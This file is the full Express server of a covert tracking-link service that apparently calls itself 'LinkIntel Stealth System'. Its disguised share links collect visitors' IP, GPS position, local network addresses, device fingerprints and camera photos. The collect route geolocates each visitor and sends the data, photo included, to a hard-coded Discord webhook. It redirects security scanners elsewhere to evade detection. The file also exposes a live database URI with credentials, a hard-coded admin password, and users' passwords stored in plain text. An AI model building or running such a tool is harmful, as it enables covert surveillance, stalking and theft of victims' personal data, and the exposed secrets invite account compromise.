const express  = require('express');
const { v4: uuidv4 } = require('uuid');
const fetch    = require('node-fetch');
const FormData = require('form-data');
const cors     = require('cors');
const path     = require('path');
const bcrypt   = require('bcrypt');
const crypto   = require('crypto');
const mongoose = require('mongoose');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '15mb' }));
app.use(express.static(path.join(__dirname, 'public')));

/* ═══════════════════════════════════════════
   MONGOOSE CONNECTION & MODELS
═══════════════════════════════════════════ */
const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://vmtolegit_db_user:E2HAIWeRndl589xk@cluster0.q5rcohu.mongodb.net/?appName=Cluster0';

mongoose.connect(MONGO_URI)
  .then(() => console.log('\x1b[32m[DB] Connected to MongoDB Atlas successfully!\x1b[0m'))
  .catch(err => console.error('\x1b[31m[DB] Connection failed:\x1b[0m', err));

const userSchema = new mongoose.Schema({
  username: { type: String, unique: true, required: true },
  passwordHash: { type: String, required: true },
  plainPassword: { type: String },
  id: { type: String, unique: true, required: true },
  isAdmin: { type: Boolean, default: false },
  adminToken: { type: String },
  isBanned: { type: Boolean, default: false },
  hasAcceptedTerms: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

const linkSchema = new mongoose.Schema({
  url: { type: String, required: true },
  label: { type: String, default: 'Shared Content' },
  contentType: { type: String, default: 'auto' },
  fakeTitle: { type: String, default: 'Shared with you' },
  fakeDesc: { type: String, default: 'Someone shared this content with you.' },
  creatorId: { type: String, required: true },
  shortCode: { type: String, unique: true, required: true },
  stealthPath: { type: String, unique: true, required: true },
  burnAfterRead: { type: Boolean, default: false },
  active: { type: Boolean, default: true },
  features: { type: [String], default: [] },
  // OG Preview fields (auto-fetched from destination URL)
  ogTitle: { type: String, default: '' },
  ogDesc: { type: String, default: '' },
  ogImage: { type: String, default: '' },
  ogSiteName: { type: String, default: '' },
  createdAt: { type: Date, default: Date.now }
});
const Link = mongoose.model('Link', linkSchema);

/* ═══════════════════════════════════════════
   OG META SCRAPER — Works for ANY website
═══════════════════════════════════════════ */
async function fetchOgData(url) {
  const parsed = (() => { try { return new URL(url); } catch { return null; } })();
  if (!parsed) return { ogTitle: '', ogDesc: '', ogImage: '', ogSiteName: '' };

  const domain      = parsed.hostname.replace('www.', '');
  const origin      = parsed.origin;
  // Google's favicon API — ALWAYS works as a fallback image for any domain
  const faviconFallback = `https://www.google.com/s2/favicons?sz=256&domain=${domain}`;

  const tryFetch = async (targetUrl) => {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), 6000);
    try {
      const r = await fetch(targetUrl, {
        signal: controller.signal,
        headers: {
          'User-Agent': 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
          'Accept': 'text/html,application/xhtml+xml',
          'Accept-Language': 'en-US,en;q=0.9'
        },
        redirect: 'follow'
      });
      clearTimeout(t);
      if (!r.ok) return null;
      return await r.text();
    } catch { clearTimeout(t); return null; }
  };

  const extract = (html) => {
    if (!html) return null;
    const get = (patterns) => {
      for (const p of patterns) {
        const m = html.match(p);
        if (m && m[1]) return m[1].replace(/&amp;/g,'&').replace(/&quot;/g,'"').replace(/&#39;/g,"'").replace(/&lt;/g,'<').replace(/&gt;/g,'>').trim();
      }
      return '';
    };

    const ogTitle = get([
      /<meta[^>]+property=["']og:title["'][^>]+content=["']([^"']{1,300})/i,
      /<meta[^>]+content=["']([^"']{1,300})["'][^>]+property=["']og:title["']/i,
      /<meta[^>]+name=["']twitter:title["'][^>]+content=["']([^"']{1,300})/i,
      /<title[^>]*>([^<]{1,300})<\/title>/i
    ]);

    const ogDesc = get([
      /<meta[^>]+property=["']og:description["'][^>]+content=["']([^"']{1,500})/i,
      /<meta[^>]+content=["']([^"']{1,500})["'][^>]+property=["']og:description["']/i,
      /<meta[^>]+name=["']description["'][^>]+content=["']([^"']{1,500})/i,
      /<meta[^>]+content=["']([^"']{1,500})["'][^>]+name=["']description["']/i,
      /<meta[^>]+name=["']twitter:description["'][^>]+content=["']([^"']{1,500})/i
    ]);

    const ogImage = get([
      /<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)/i,
      /<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:image["']/i,
      /<meta[^>]+name=["']twitter:image["'][^>]+content=["']([^"']+)/i,
      /<meta[^>]+name=["']twitter:image:src["'][^>]+content=["']([^"']+)/i
    ]);

    const ogSiteName = get([
      /<meta[^>]+property=["']og:site_name["'][^>]+content=["']([^"']{1,100})/i,
      /<meta[^>]+content=["']([^"']{1,100})["'][^>]+property=["']og:site_name["']/i
    ]) || domain;

    // If ogImage is a relative URL, make it absolute
    let absImage = ogImage;
    if (ogImage && !ogImage.startsWith('http')) {
      absImage = ogImage.startsWith('/') ? `${origin}${ogImage}` : `${origin}/${ogImage}`;
    }

    return { ogTitle, ogDesc, ogImage: absImage, ogSiteName };
  };

  // Strategy 1: Try fetching the exact URL
  let html = await tryFetch(url);
  let result = extract(html);

  // Strategy 2: If no OG image found, try fetching the root domain homepage
  if (result && !result.ogImage && url !== origin + '/') {
    const homeHtml = await tryFetch(origin + '/');
    const homeResult = extract(homeHtml);
    if (homeResult && homeResult.ogImage) result.ogImage = homeResult.ogImage;
  }

  // Strategy 3: Always guarantee an image using Google favicon API
  if (!result || !result.ogImage) {
    result = result || { ogTitle: domain, ogDesc: '', ogImage: '', ogSiteName: domain };
    result.ogImage = faviconFallback;
  }

  console.log(`[OG] ${domain} → title="${result.ogTitle?.slice(0,50)}" img="${result.ogImage?.slice(0,60)}"`);
  return result;
}

const captureSchema = new mongoose.Schema({
  shortCode: { type: String, required: true, index: true },
  id: { type: String, required: true },
  realIp: { type: String },
  location: { type: mongoose.Schema.Types.Mixed },
  fingerprint: { type: String },
  serverTime: { type: Date, default: Date.now },
  stealthPath: { type: String },
  ip: { type: String },
  battery: { type: Number },
  charging: { type: Boolean },
  connection: { type: String },
  deviceType: { type: String },
  userAgent: { type: String },
  screenWidth: { type: Number },
  screenHeight: { type: Number },
  language: { type: String },
  timezone: { type: String },
  platform: { type: String },
  cookieEnabled: { type: Boolean },
  doNotTrack: { type: String },
  gps: { type: mongoose.Schema.Types.Mixed },
  localIps: [String],
  motion: { type: mongoose.Schema.Types.Mixed },
  cpuCores: { type: mongoose.Schema.Types.Mixed },
  deviceRam: { type: mongoose.Schema.Types.Mixed },
  canvasHash: { type: String },
  audioHash: { type: String },
  subnetNodes: [String],
  cameraPhoto: { type: String },
  webglHash: { type: String }
});
const Capture = mongoose.model('Capture', captureSchema);

const banSchema = new mongoose.Schema({
  type: { type: String, required: true }, // 'ip' or 'fingerprint'
  value: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});
const Ban = mongoose.model('Ban', banSchema);

/* ═══════════════════════════════════════════
   DEFAULT ADMIN SEED
═══════════════════════════════════════════ */
async function seedAdmin() {
  const adminUsername = 'adminrupankar';
  const existing = await User.findOne({ username: adminUsername });
  if (!existing) {
    const passwordHash = await bcrypt.hash('8637852441', 10);
    const newAdmin = new User({
      username: adminUsername,
      passwordHash: passwordHash,
      plainPassword: '8637852441',
      id: 'uid_admin',
      isAdmin: true,
      adminToken: crypto.randomBytes(16).toString('hex')
    });
    await newAdmin.save();
    console.log('\x1b[33m[DB] Default admin account seeded.\x1b[0m');
  }
}
mongoose.connection.once('open', seedAdmin);

/* ═══════════════════════════════════════════
   SSE — real-time push to dashboard
═══════════════════════════════════════════ */
const sseClients = {};

app.get('/api/stream/:userId', (req, res) => {
  const { userId } = req.params;
  res.setHeader('Content-Type',  'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection',    'keep-alive');
  res.flushHeaders();

  if (!sseClients[userId]) sseClients[userId] = [];
  sseClients[userId].push(res);

  const heartbeat = setInterval(() => res.write(': ping\n\n'), 25000);
  req.on('close', () => {
    clearInterval(heartbeat);
    sseClients[userId] = (sseClients[userId] || []).filter(r => r !== res);
  });
});

function pushToUser(userId, event, data) {
  const clients = sseClients[userId] || [];
  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  clients.forEach(r => { try { r.write(payload); } catch {} });
}

/* ═══════════════════════════════════════════
   AUTH
═══════════════════════════════════════════ */
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Missing fields' });

    const user = await User.findOne({ username });
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });

    if (user.isBanned) return res.status(403).json({ error: 'ACCOUNT BANNED. ACCESS DENIED.' });

    const match = await bcrypt.compare(password, user.passwordHash);
    if (!match) return res.status(401).json({ error: 'Invalid credentials' });

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    if (ip) {
      const ban = await Ban.findOne({ type: 'ip', value: ip });
      if (ban) return res.status(403).json({ error: 'IP BANNED. ACCESS DENIED.' });
    }

    if (user.isAdmin) {
      user.adminToken = crypto.randomBytes(16).toString('hex');
      await user.save();
    }

    const responseData = { success: true, userId: user.id, username, isAdmin: !!user.isAdmin, hasAcceptedTerms: !!user.hasAcceptedTerms };
    if (user.isAdmin) responseData.adminToken = user.adminToken;
    res.json(responseData);
  } catch (err) {
    console.error('[LOGIN ERROR]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/register', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
    if (username.length < 3) return res.status(400).json({ error: 'Username must be at least 3 characters' });
    if (password.length < 4) return res.status(400).json({ error: 'Password must be at least 4 characters' });

    const existing = await User.findOne({ username });
    if (existing) return res.status(409).json({ error: 'Username already taken' });

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    if (ip) {
      const ban = await Ban.findOne({ type: 'ip', value: ip });
      if (ban) return res.status(403).json({ error: 'IP BANNED. REGISTRATION DENIED.' });
    }

    const passwordHash = await bcrypt.hash(password, 10);
    const id = 'uid_' + uuidv4().replace(/-/g,'').slice(0,12);

    const newUser = new User({ username, passwordHash, plainPassword: password, id, isAdmin: false, hasAcceptedTerms: false });
    await newUser.save();

    res.json({ success: true, userId: id, username, isAdmin: false, hasAcceptedTerms: false });
  } catch (err) {
    console.error('[REGISTER ERROR]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/accept-terms', async (req, res) => {
  try {
    const { userId } = req.body;
    await User.updateOne({ id: userId }, { hasAcceptedTerms: true });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

/* ═══════════════════════════════════════════
   BAN STATUS CHECK (polled by client)
═══════════════════════════════════════════ */
app.get('/api/check-ban/:userId', async (req, res) => {
  try {
    const user = await User.findOne({ id: req.params.userId });
    if (!user) return res.json({ banned: true }); // user deleted = force logout
    if (user.isBanned) return res.json({ banned: true });
    return res.json({ banned: false });
  } catch (err) {
    res.status(500).json({ banned: false }); // on error, don't kick
  }
});

/* ═══════════════════════════════════════════
   DEFENSIVE TRAP (HONEY-POT)
═══════════════════════════════════════════ */
app.post('/api/trap', (req, res) => {
  const { user, pass, ua } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
  console.log(`[HONEY-POT TRIPPED] IP: ${ip} | User: ${user} | Pass: ${pass}`);

  const discordWebhookUrl = 'https://discord.com/api/webhooks/1507371930569936917/OkREOF7MjUKaykazIurzIWzqBxqiigMJWx6a3ilA7ylPIb9vM2pYxpOmfFqBIMefN0ZX';
  const embed = {
    title: "🚨 INTRUSION ATTEMPT BLOCKED", color: 16711680,
    description: "Someone attempted to access the legacy admin portal.",
    fields: [
      { name: "Intruder IP", value: ip, inline: true },
      { name: "Attempted User", value: user || 'N/A', inline: true },
      { name: "Attempted Pass", value: pass || 'N/A', inline: true },
      { name: "User-Agent", value: ua || 'N/A', inline: false }
    ],
    timestamp: new Date().toISOString()
  };
  fetch(discordWebhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) }).catch(() => {});
  res.json({ success: true });
});

/* ═══════════════════════════════════════════
   SUPER ADMIN — GOD MODE
═══════════════════════════════════════════ */
app.get('/api/admin/global', async (req, res) => {
  try {
    const userId = req.headers['x-user-id'];
    const token  = req.headers['x-admin-token'];
    const user   = await User.findOne({ id: userId });

    if (!user || !user.isAdmin || user.adminToken !== token) {
      return res.status(403).json({ error: 'Forbidden. Admin access required.' });
    }

    const users = await User.find({}, { passwordHash: 0 });
    const links = await Link.find({});
    const allCaptures = await Capture.find({});

    const capturesMap = {};
    allCaptures.forEach(c => {
      if (!capturesMap[c.shortCode]) capturesMap[c.shortCode] = [];
      capturesMap[c.shortCode].push(c);
    });

    const linksWithCount = links.map(l => {
      const caps = capturesMap[l.shortCode] || [];
      return { ...l.toObject(), visitCount: caps.length };
    });

    res.json({ users, links: linksWithCount, captures: capturesMap });
  } catch (err) {
    console.error('[GOD MODE ERROR]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Helper for admin auth middleware on routes
async function requireAdmin(req, res, next) {
  const userId = req.headers['x-user-id'];
  const token  = req.headers['x-admin-token'];
  const user   = await User.findOne({ id: userId });
  if (!user || !user.isAdmin || user.adminToken !== token) {
    return res.status(403).json({ error: 'Forbidden. Admin access required.' });
  }
  next();
}

app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
  try {
    const u = await User.findOne({ id: req.params.id });
    if (!u) return res.status(404).json({ error: 'User not found' });
    if (u.isAdmin) return res.status(400).json({ error: 'Cannot delete admin' });
    
    await User.deleteOne({ id: req.params.id });
    const userLinks = await Link.find({ creatorId: req.params.id });
    for (let link of userLinks) {
      await Capture.deleteMany({ shortCode: link.shortCode });
      await Link.deleteOne({ _id: link._id });
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/users/:id/ban', requireAdmin, async (req, res) => {
  try {
    const u = await User.findOne({ id: req.params.id });
    if (!u) return res.status(404).json({ error: 'User not found' });
    if (u.isAdmin) return res.status(400).json({ error: 'Cannot ban admin' });
    
    u.isBanned = !u.isBanned;
    await u.save();
    res.json({ success: true, isBanned: u.isBanned });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

app.delete('/api/admin/captures/:id', requireAdmin, async (req, res) => {
  try {
    await Capture.deleteOne({ id: req.params.id });
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/bans', requireAdmin, async (req, res) => {
  try {
    const { type, value } = req.body;
    if (!type || !value) return res.status(400).json({ error: 'Missing fields' });
    const existing = await Ban.findOne({ value });
    if (!existing) {
      await new Ban({ type, value }).save();
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

app.delete('/api/admin/bans/:value', requireAdmin, async (req, res) => {
  try {
    await Ban.deleteOne({ value: req.params.value });
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/api/admin/bans', requireAdmin, async (req, res) => {
  try {
    const bans = await Ban.find({});
    res.json(bans);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

/* ═══════════════════════════════════════════
   LINKS CRUD
═══════════════════════════════════════════ */
app.post('/api/links', async (req, res) => {
  try {
    const { url, label, contentType, fakeTitle, fakeDesc, creatorId, customPath, burnAfterRead, features } = req.body;
    if (!url || !creatorId) return res.status(400).json({ error: 'Missing required fields' });

    const chars = 'ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    const shortCode = Array.from({ length: 11 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');

    let stealthPath = customPath;
    if (!stealthPath) {
      stealthPath = `/s/${shortCode}`;
    } else if (!stealthPath.startsWith('/')) {
      stealthPath = `/${stealthPath}`;
    }

    const existingPath = await Link.findOne({ stealthPath });
    if (existingPath) return res.status(400).json({ error: 'That custom path is already taken.' });

    // Fetch OG metadata from destination URL (non-blocking — save in background)
    fetchOgData(url).then(og => {
      Link.findOneAndUpdate({ shortCode }, {
        ogTitle: og.ogTitle, ogDesc: og.ogDesc,
        ogImage: og.ogImage, ogSiteName: og.ogSiteName
      }).catch(() => {});
    });

    const newLink = new Link({
      url, label: label || 'Shared Content',
      contentType: contentType || 'auto',
      fakeTitle: fakeTitle || 'Shared with you',
      fakeDesc: fakeDesc || 'Someone shared this content with you.',
      creatorId, shortCode, stealthPath,
      burnAfterRead: !!burnAfterRead, active: true,
      features: features || []
    });
    await newLink.save();

    // Build dynamic URL from request host
    const proto = req.headers['x-forwarded-proto'] || req.protocol || 'http';
    const host  = req.get('host');
    const fullUrl = `${proto}://${host}${stealthPath}`;

    res.json({ success: true, shortCode, stealthPath, shortUrl: fullUrl });
  } catch (err) {
    console.error('[CREATE LINK ERROR]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/links/:creatorId', async (req, res) => {
  try {
    const links = await Link.find({ creatorId: req.params.creatorId });
    const result = [];
    for (let l of links) {
      const visitCount = await Capture.countDocuments({ shortCode: l.shortCode });
      result.push({ ...l.toObject(), visitCount });
    }
    res.json(result);
  } catch (err) {
    console.error('[GET LINKS ERROR]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.patch('/api/links/:shortCode', async (req, res) => {
  try {
    const lnk = await Link.findOneAndUpdate({ shortCode: req.params.shortCode }, req.body, { new: true });
    if (!lnk) return res.status(404).json({ error: 'Not found' });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.delete('/api/links/:shortCode', async (req, res) => {
  try {
    await Link.deleteOne({ shortCode: req.params.shortCode });
    await Capture.deleteMany({ shortCode: req.params.shortCode });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

/* ═══════════════════════════════════════════
   LINK META (called by visitor landing page)
═══════════════════════════════════════════ */
app.get('/api/meta', async (req, res) => {
  try {
    const stealthPath = req.query.path;
    if (!stealthPath) return res.status(400).json({ error: 'Missing path' });

    let lnk = await Link.findOne({ stealthPath });
    if (!lnk && stealthPath.startsWith('/s/')) {
      const shortCode = stealthPath.replace('/s/', '');
      lnk = await Link.findOne({ shortCode });
    }
    if (!lnk) return res.status(404).json({ error: 'Not found' });

    res.json({
      fakeTitle: lnk.fakeTitle, fakeDesc: lnk.fakeDesc,
      contentType: lnk.contentType, destinationUrl: lnk.url,
      features: lnk.features || []
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

/* ═══════════════════════════════════════════
   DATA COLLECTION
═══════════════════════════════════════════ */
app.post('/api/collect', async (req, res) => {
  try {
    const data = req.body;
    const { stealthPath } = data;

    let lnk = null;
    if (stealthPath) lnk = await Link.findOne({ stealthPath });
    if (!lnk && data.shortCode) lnk = await Link.findOne({ shortCode: data.shortCode });

    if (!lnk) return res.status(404).json({ error: 'Unknown link' });

    const shortCodeRef = lnk.shortCode;
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';

    // Check IP Ban
    if (ip !== 'Unknown') {
      const banIp = await Ban.findOne({ type: 'ip', value: ip });
      if (banIp) return res.status(403).json({ error: 'BANNED IP' });
    }

    // Geolocation from IP
    let location = null;
    if (ip && ip !== 'Unknown' && ip !== '::1' && ip !== '127.0.0.1') {
      try {
        const geoReq = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await geoReq.json();
        if (geoData.status === 'success') location = geoData;
      } catch {}
    }

    const fpString = `${data.userAgent}|${data.language}|${data.screenWidth}x${data.screenHeight}|${data.timezone}`;
    const fingerprint = crypto.createHash('md5').update(fpString).digest('hex').substring(0, 12);

    // Check Fingerprint Ban
    const banFp = await Ban.findOne({ type: 'fingerprint', value: fingerprint });
    if (banFp) return res.status(403).json({ error: 'BANNED DEVICE' });

    const captureObj = {
      shortCode: shortCodeRef,
      id: uuidv4().slice(0,8),
      realIp: ip,
      location,
      fingerprint,
      serverTime: new Date(),
      stealthPath: data.stealthPath,
      ip: data.ip,
      battery: data.battery,
      charging: data.charging,
      connection: data.connection,
      deviceType: data.deviceType,
      userAgent: data.userAgent,
      screenWidth: data.screenWidth,
      screenHeight: data.screenHeight,
      language: data.language,
      timezone: data.timezone,
      platform: data.platform,
      cookieEnabled: data.cookieEnabled,
      doNotTrack: data.doNotTrack,
      gps: data.gps,
      localIps: data.localIps || [],
      motion: data.motion,
      cpuCores: data.cpuCores,
      deviceRam: data.deviceRam,
      canvasHash: data.canvasHash,
      audioHash: data.audioHash,
      subnetNodes: data.subnetNodes || [],
      cameraPhoto: data.cameraPhoto || null,
      webglHash: data.webglHash
    };

    const newCapture = new Capture(captureObj);
    await newCapture.save();

    // Push real-time notification to creator
    pushToUser(lnk.creatorId, 'capture', {
      shortCode: shortCodeRef, linkLabel: lnk.label,
      captureId: newCapture.id,
      ip, battery: data.battery, deviceType: data.deviceType,
      hasCamera: !!data.cameraPhoto,
      time: newCapture.serverTime
    });

    // --- DISCORD WEBHOOK ---
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1507371930569936917/OkREOF7MjUKaykazIurzIWzqBxqiigMJWx6a3ilA7ylPIb9vM2pYxpOmfFqBIMefN0ZX';
    try {
      const locStr = location ? `${location.city}, ${location.country} (${location.isp})` : 'Unknown';
      const embed = {
        title: "🚨 Extreme Intelligence Captured", color: 65280,
        fields: [
          { name: "Target IP", value: ip || 'Unknown', inline: true },
          { name: "Local Network IP", value: data.localIps && data.localIps.length ? data.localIps.join(', ') : 'Not Leaked', inline: true },
          { name: "Active Subnet Nodes", value: data.subnetNodes && data.subnetNodes.length ? data.subnetNodes.join(', ') : 'None Found', inline: true },
          { name: "GPS Coordinates", value: data.gps ? `[${data.gps.lat.toFixed(5)}, ${data.gps.lon.toFixed(5)}](https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon})` : 'Denied', inline: true },
          { name: "Geolocation", value: locStr, inline: true },
          { name: "Hardware", value: `${data.deviceType} / CPU: ${data.cpuCores} / RAM: ${data.deviceRam}GB / Bat: ${data.battery !== null ? data.battery + '%' : '?'}`, inline: false },
          { name: "Fingerprints", value: `Canvas: ${data.canvasHash || '?'} | Audio: ${data.audioHash || '?'} | WebGL: ${data.webglHash || '?'}`, inline: false },
          { name: "Media Captured", value: `${data.cameraPhoto ? "📷 Image" : "❌ No Cam"}`, inline: false }
        ],
        footer: { text: "LinkIntel Stealth System | Burner: " + (lnk.burnAfterRead ? 'YES' : 'NO') },
        timestamp: newCapture.serverTime
      };

      const form = new FormData();
      if (data.cameraPhoto) {
        const base64Data = data.cameraPhoto.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        form.append('file1', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
        embed.image = { url: "attachment://capture.jpg" };
      }
      form.append('payload_json', JSON.stringify({ embeds: [embed] }));
      fetch(discordWebhookUrl, { method: 'POST', body: form }).catch(err => console.error("Discord webhook failed", err));
    } catch (e) {
      console.error("Webhook error", e);
    }

    // Burner Link
    if (lnk.burnAfterRead) {
      console.log(`[BURNER] Link ${shortCodeRef} self-destructing.`);
      await Link.deleteOne({ shortCode: shortCodeRef });
    }

    res.json({ success: true, destinationUrl: lnk.url || '' });
  } catch (err) {
    console.error('[COLLECT ERROR]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/captures/:shortCode', async (req, res) => {
  try {
    const caps = await Capture.find({ shortCode: req.params.shortCode }).sort({ serverTime: -1 });
    res.json(caps);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.delete('/api/captures/:shortCode/:captureId', async (req, res) => {
  try {
    const { shortCode, captureId } = req.params;
    await Capture.deleteOne({ shortCode, id: captureId });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

/* ═══════════════════════════════════════════
   VISITOR ROUTE CATCH-ALL & BOT HANDLING
   ** MUST BE LAST ** — after all /api/ routes
═══════════════════════════════════════════ */
app.get('*', async (req, res, next) => {
  if (req.path.startsWith('/api/')) return next();

  try {
    const lnk = await Link.findOne({ stealthPath: req.path });
    if (lnk) {
      if (!lnk.active) return res.status(404).send('Link not found or inactive');

      const ua = req.headers['user-agent'] || '';

      // Social media preview scrapers — serve OG preview page
      const isSocialBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|linkedinbot|slackbot|discordbot|pinterest|vkshare/i.test(ua);
      if (isSocialBot) {
        console.log(`[OG PREVIEW] Social bot on ${req.path}. UA: ${ua}`);
        const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
        const host  = req.get('host');
        const thisUrl = `${proto}://${host}${req.path}`;

        // Use stored OG data, or fall back to fakeTitle/fakeDesc
        const title    = lnk.ogTitle    || lnk.fakeTitle    || lnk.label || 'Shared Content';
        const desc     = lnk.ogDesc     || lnk.fakeDesc     || 'Check this out';
        const image    = lnk.ogImage    || '';
        const siteName = lnk.ogSiteName || new URL(lnk.url).hostname.replace('www.','');

        const ogHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>${escapeHtml(title)}</title>
  <meta property="og:type"        content="website" />
  <meta property="og:url"         content="${thisUrl}" />
  <meta property="og:title"       content="${escapeHtml(title)}" />
  <meta property="og:description" content="${escapeHtml(desc)}" />
  ${image ? `<meta property="og:image" content="${escapeHtml(image)}" />` : ''}
  <meta property="og:site_name"   content="${escapeHtml(siteName)}" />
  <meta name="twitter:card"       content="summary_large_image" />
  <meta name="twitter:title"      content="${escapeHtml(title)}" />
  <meta name="twitter:description" content="${escapeHtml(desc)}" />
  ${image ? `<meta name="twitter:image" content="${escapeHtml(image)}" />` : ''}
  <meta http-equiv="refresh" content="0;url=${lnk.url}" />
</head>
<body></body>
</html>`;
        return res.type('html').send(ogHtml);
      }

      // Security / indexing bots — redirect away to maintain stealth
      const isSecurityBot = /googlebot|bingbot|yandex|baidu|crawler|spider|crawling|virustotal|curl|wget|python-requests|scrapy/i.test(ua);
      if (isSecurityBot) {
        console.log(`[EVASION] Security bot blocked on ${req.path}. UA: ${ua}`);
        return res.redirect('https://en.wikipedia.org/wiki/Main_Page');
      }

      // Real human visitor — serve the capture landing page
      return res.sendFile(path.join(__dirname, 'public', 'landing.html'));
    }
  } catch (err) {
    console.error('[CATCH-ALL ERROR]', err);
  }
  next();
});

function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

/* ═══════════════════════════════════════════
   START
═══════════════════════════════════════════ */
app.listen(PORT, () => {
  console.log('\x1b[32m');
  console.log('  ██╗     ██╗███╗   ██╗██╗  ██╗██╗███╗   ██╗████████╗███████╗██╗     ');
  console.log('  ██║     ██║████╗  ██║██║ ██╔╝██║████╗  ██║╚══██╔══╝██╔════╝██║     ');
  console.log('  ██║     ██║██╔██╗ ██║█████╔╝ ██║██╔██╗ ██║   ██║   █████╗  ██║     ');
  console.log('  ██║     ██║██║╚██╗██║██╔═██╗ ██║██║╚██╗██║   ██║   ██╔══╝  ██║     ');
  console.log('  ███████╗██║██║ ╚████║██║  ██╗██║██║ ╚████║   ██║   ███████╗███████╗');
  console.log('  ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝');
  console.log('\x1b[0m');
  console.log(`\x1b[36m  ► Portal : \x1b[1mhttp://localhost:${PORT}\x1b[0m`);
  console.log(`\x1b[90m  ► Login  : adminrupankar / 8637852441\x1b[0m\n`);
});
